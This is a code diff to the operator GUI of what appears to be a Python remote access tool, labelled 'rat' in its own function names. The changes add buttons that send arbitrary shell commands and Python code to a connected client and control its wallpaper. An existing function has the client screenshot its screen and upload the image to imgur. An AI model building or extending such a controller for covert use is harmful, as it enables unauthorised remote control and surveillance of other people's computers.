@@ -98,13 +98,13 @@ def handle_menu_click(text: str) -> None:
     """
     index = {
         "Menu": [open_menu, None],
-        "Devices": [ui.pagesWidget.setCurrentIndex, 1],
-        "Screenshot": [ui.pagesWidget.setCurrentIndex, 2],
-        "Wallpaper": [ui.pagesWidget.setCurrentIndex, 3],
-        "Console": [ui.pagesWidget.setCurrentIndex, 4],
-        "Python": [ui.pagesWidget.setCurrentIndex, 5],
-        "Download": [ui.pagesWidget.setCurrentIndex, 6],
-        "Settings": [ui.pagesWidget.setCurrentIndex, 7]
+        "Devices": [ui.pagesWidget.setCurrentIndex, 0],
+        "Screenshot": [ui.pagesWidget.setCurrentIndex, 1],
+        "Wallpaper": [ui.pagesWidget.setCurrentIndex, 2],
+        "Console": [ui.pagesWidget.setCurrentIndex, 3],
+        "Python": [ui.pagesWidget.setCurrentIndex, 4],
+        "Download": [ui.pagesWidget.setCurrentIndex, 5],
+        "Settings": [ui.pagesWidget.setCurrentIndex, 6]
     }
     index[text][0](index[text][1])
 
@@ -120,6 +120,7 @@ def handle_ping(data) -> None:
 
 
 def on_logs(data):
+    print(data)
     ui.logsPytoon.append(data)
     ui.logsConsole.append(data)
     ui.downloadLogs.append(data)
@@ -144,15 +145,21 @@ def take_screenshot() -> None:
     client.trigger('admin-' + str(client_id), 'python', f"""
 imgur_image = daun.screenshot.upload_to_imgur("{Settings.get_settings().get('client_id')}")
 client.trigger('client-{client_id}', 'screenshot', imgur_image)
-client.trigger('client-{client_id}', 'logs', "Received screenshot: " + imgur_image)
+log("Received screenshot: " + imgur_image)
 """)
 
 
 def on_screenshot(data):
-    print("on screenshot")
     image = QtGui.QImage()
     image.loadFromData(requests.get(data).content)
     ui.screenshotLabel.setPixmap(QtGui.QPixmap(image))
+
+
+def we_controller(button):
+    client.trigger('admin-' + str(client_id), 'python', f"""
+daun.wallpaperengine.control_we("{button.text().lower()}")
+log("Received we command: {button.text().lower()}")
+""")
 
 
 def connect_to_rat() -> None:
@@ -211,11 +218,29 @@ ui.leftMenu.itemClicked.connect(lambda: handle_menu_click(ui.leftMenu.currentIte
 ui.saveSettingsButton.clicked.connect(lambda: (globals().update(settings=update_settings(ui))))
 ui.reconRefreshButton.clicked.connect(lambda: reconnect_to_pusher())
 ui.connectButton.clicked.connect(lambda: connect_to_rat())
+ui.availableDevices.itemDoubleClicked.connect(lambda: connect_to_rat())
 ui.pingButton.clicked.connect(lambda: client.trigger('admin-' + client_id, 'ping', 'ping'))
 ui.clearPythonLogs.clicked.connect(lambda: clear_logs())
 ui.clearConsoleLogs.clicked.connect(lambda: clear_logs())
 ui.clearDlLogsButton.clicked.connect(lambda: clear_logs())
 ui.takeScreenshotButton.clicked.connect(lambda: take_screenshot())
+ui.setWallpaperButton.clicked.connect(lambda: client.trigger('admin-' + str(client_id), 'python', f"""
+daun.wallpaper.set_wallpaper("{ui.wallpaperUrlBox.text()}")
+log("Wallpaper set to: {ui.wallpaperUrlBox.text()}")
+"""))
+ui.pauseWallpaperEngineButton.clicked.connect(lambda: we_controller(ui.pauseWallpaperEngineButton))
+ui.playWallpaperEngineButton.clicked.connect(lambda: we_controller(ui.playWallpaperEngineButton))
+ui.stopWallpaperEngineButton.clicked.connect(lambda: we_controller(ui.stopWallpaperEngineButton))
+ui.muteWallpaperEngineButton.clicked.connect(lambda: we_controller(ui.muteWallpaperEngineButton))
+ui.unmuteWallpaperEngineButton.clicked.connect(lambda: we_controller(ui.unmuteWallpaperEngineButton))
+ui.wallpaperScreenshotButton.clicked.connect(lambda: client.trigger('admin-' + str(client_id), 'python', f"""
+daun.wallpaper.set_wallpaper(daun.screenshot.save_screenshot())
+log("Screenshot set as wallpaper")
+"""))
+ui.sendCommandButton.clicked.connect(lambda: client.trigger('admin-' + client_id, 'command',
+                                                            ui.commandBox.text()))
+ui.execPythonButton.clicked.connect(lambda: client.trigger('admin-' + client_id, 'python',
+                                                           ui.pythonScriptEditor.toPlainText()))
 
 # Handling closing of the window to exit whole program
 sys.exit(app.exec_())
